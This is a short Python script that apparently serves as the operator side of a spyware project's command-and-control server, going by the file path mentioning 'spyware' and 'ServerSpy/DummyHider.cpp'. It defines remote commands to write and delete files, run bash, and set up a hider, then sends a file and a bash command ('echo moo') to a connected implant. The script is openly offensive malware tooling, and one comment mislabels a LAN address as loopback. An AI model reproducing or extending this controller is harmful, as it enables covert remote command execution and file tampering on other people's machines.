from server import Server
import time
from icecream import ic

HOST = "192.168.83.130"  # Standard loopback interface address (localhost)
PORT = 23456  # Port to listen on (non-privileged ports are > 1023)

FunCode: dict[str, int] = {
    "WRITE_FILE": 1,
    "DELETE_FILE": 2,
    "RUN_BASH": 3,
    "HIDER_SETUP": 4,
}


def main():
    serv = Server()
    with serv.serverConnection(HOST, PORT) as conn:
        serv.sendCommand(conn, FunCode["WRITE_FILE"], "5678.out")
        time.sleep(4)
        serv.sendFile(conn, "temp.out")
        time.sleep(5)
        conn.close()  # TODO debug only
        # ans = serv.recvCommand(conn)
        # print(f"{ans = }")
        # serv.sendFile(conn, "/home/avner/Arazim-Projects-2024---spyware/src/ServerSpy/DummyHider.cpp")


def test_bash():
    server = Server()
    with server.serverConnection(HOST, PORT) as conn:
        server.sendCommand(conn, FunCode["RUN_BASH"], "echo moo")
        ans = server.recvCommand(conn)
        ic(ans)


if __name__ == "__main__":
    # main()
    test_bash()
